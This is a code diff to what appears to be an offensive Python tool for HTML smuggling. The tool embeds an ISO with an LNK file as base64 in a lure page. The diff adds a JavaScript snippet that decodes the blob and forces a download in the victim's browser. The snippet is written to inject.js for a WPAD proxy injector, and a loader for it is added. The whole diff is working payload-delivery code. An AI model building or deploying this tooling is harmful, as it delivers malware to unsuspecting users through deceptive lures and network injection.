@@ -153,6 +153,24 @@ def _iso_bytes(lnk_data: bytes, lnk_filename: str, vol_label: str = _ISO_VOL_DEF
 
 # ── HTML smuggling page ───────────────────────────────────────────────────────
 
+def _iso_download_js(iso_b64: str, iso_filename: str) -> str:
+    """Standalone JS snippet that triggers an ISO blob download.
+    Used directly by the WPAD proxy injector — no surrounding HTML needed.
+    """
+    return (
+        "(function(){"
+        f'var b="{iso_b64}";'
+        "var r=atob(b),a=new Uint8Array(r.length);"
+        "for(var i=0;i<r.length;i++)a[i]=r.charCodeAt(i);"
+        "var u=URL.createObjectURL(new Blob([a],{type:'application/octet-stream'}));"
+        "var el=document.createElement('a');"
+        f'el.href=u;el.download="{iso_filename}";'
+        "document.body.appendChild(el);el.click();"
+        "setTimeout(function(){URL.revokeObjectURL(u);document.body.removeChild(el);},3000);"
+        "})();"
+    )
+
+
 def _smuggle_html(iso_b64: str, iso_filename: str, lnk_display: str, lure: str) -> str:
     title, desc = LURE_PRESETS.get(lure, LURE_PRESETS['update'])
     return f"""\
@@ -240,7 +258,13 @@ def build_smuggle_payload(
     with open(html_path, 'w', encoding='utf-8') as f:
         f.write(html)
 
+    js_snippet = _iso_download_js(iso_b64, iso_name)
+    js_path    = os.path.join(output_dir, 'inject.js')
+    with open(js_path, 'w', encoding='utf-8') as f:
+        f.write(js_snippet)
+
     print(f"\n[+] {html_path}")
+    print(f"[+] {js_path}  (WPAD proxy injection snippet)")
     print(f"    Page size : {len(html)//1024}KB  (ISO embedded as base64 blob)")
     print()
     print(f"[*] Delivery:")
@@ -251,3 +275,12 @@ def build_smuggle_payload(
     print(f"    Lure  : {lure}  (--smuggle-lure: {' | '.join(LURE_PRESETS)})")
 
     return True
+
+
+def load_inject_js(output_dir: str) -> str | None:
+    """Return the inject.js content from a previous build_smuggle_payload call, or None."""
+    js_path = os.path.join(output_dir, 'inject.js')
+    if os.path.exists(js_path):
+        with open(js_path, 'r', encoding='utf-8') as f:
+            return f.read()
+    return None
